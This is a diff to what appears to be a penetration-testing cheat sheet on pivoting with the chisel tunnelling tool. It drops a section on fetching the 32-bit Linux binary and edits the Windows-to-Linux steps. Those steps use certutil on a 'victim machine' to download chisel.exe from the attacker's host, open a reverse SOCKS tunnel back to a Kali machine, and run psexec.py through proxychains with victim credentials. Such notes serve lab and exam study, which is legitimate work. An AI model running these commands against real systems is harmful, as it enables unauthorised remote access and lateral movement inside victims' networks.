@@ -1445,14 +1445,6 @@ gunzip -d *.gz
 chmod +x chisel_1.8.1_windows_386
 mv chisel_1.8.1_windows_386 chisel.exe
 ````
-##### Chisel Linux 32bit
-````
-https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_386.gz
-cp /home/kali/Downloads/chisel_1.8.1_linux_386.gz .
-gunzip -d *.gz
-chmod +x chisel_1.8.1_linux_386
-mv chisel_1.8.1_linux_386 chisel32
-````
 ##### Chisel Nix
 ````
 locate chisel
@@ -1460,7 +1452,7 @@ locate chisel
 ````
 ###### Windows to Nix
 ````
-chisel server --reverse -p 1234 #On your kali machine
+chisel server --port 8000 --socks5 --reverse #On your kali machine
 vim /etc/proxychains.conf
 [ProxyList]
 # add proxy here ...
@@ -1469,7 +1461,7 @@ vim /etc/proxychains.conf
 #socks4         127.0.0.1 8080
 socks5 127.0.0.1 1080
 certutil -urlcache -split -f http://<your $IP>:<Your Porty>/chisel.exe
-.\chisel.exe client <your kali $IP>:1234 R:socks #On victim machine
+.\chisel client <your IP>:8000 R:socks #On victim machine
 proxychains psexec.py victim:password@<victim $IP> cmd.exe
 ````
 
